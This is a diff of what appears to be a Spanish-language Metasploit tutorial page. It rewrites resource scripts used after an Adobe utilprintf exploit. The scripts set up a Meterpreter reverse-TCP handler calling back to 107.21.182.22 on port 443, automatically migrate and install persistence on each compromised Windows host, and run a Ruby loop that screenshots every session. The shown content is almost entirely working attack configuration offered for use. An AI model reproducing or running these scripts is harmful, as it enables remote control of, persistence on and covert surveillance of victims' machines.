@@ -99,25 +99,46 @@ msf exploit(adobe_utilprintf) > exploit
 </div>
 
 <pre class="sh_sh">
-# cat /root/autoruncommands.rc 
+# cat /root/migrate_persistence.rc
 run post/windows/manage/migrate
 run persistence -U -i 5 -p 443 -r 107.21.182.22 //o la ip de la máquina donde tengan mfs
 </pre>
 
 <pre class="sh_sh">
-msf > use exploit/multi/handler
-msf > set PAYLOAD windows/meterpreter/reverse_tcp
-msf > set LPORT 443
-msf > set LHOST 107.21.182.22
-msf > set AutoRunScript multi_console_command -rc /root/autoruncommands.rc
-msf > exploit
-[*] Handler binding to LHOST 0.0.0.0
-[*] Started reverse handler
-[*] Starting the payload handler...
+# cat /root/autoruncommands.rc
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 443
+set LHOST 107.21.182.22
+set AutoRunScript multi_console_command -rc /root/migrate_persistence.rc
+set ExitOnSession false
+exploit -j
+
+-ruby-
+        sleep(1)
+        print_status("waiting on an incoming session...")
+        while (true)
+                framework.sessions.each_pair do |sid,s|
+                thost = s.session_host
+
+                if s.ext.aliases['stdapi']
+                        print_status("Screenshotting session #{sid} #{thost}...")
+                        s.console.run_single("screenshot -p #{thost}_#{sid}.jpg -v false -q 85")
+                else
+                        print_status("session #{sid} #{thost} active, but not yet configurated")
+                end
+        end
+end
+-/ruby-
+</pre>
+
+<pre class="sh_sh">
+# ./msfconsole -r /root/autoruncommands.rc
 </pre>
 
 <ul>
     <li><a href="http://johnbabio.wordpress.com/tag/autorunscript/" target="_blank">http://johnbabio.wordpress.com/tag/autorunscript/</a></li>
+    <li><a href="https://community.rapid7.com/community/metasploit/blog/2010/03/22/automating-the-metasploit-console" target="_blank">https://community.rapid7.com/community/metasploit/blog/2010/03/22/automating-the-metasploit-console</a></li>
 </ul>
 
 <div class="p">Listop, a empezar a divertirnos
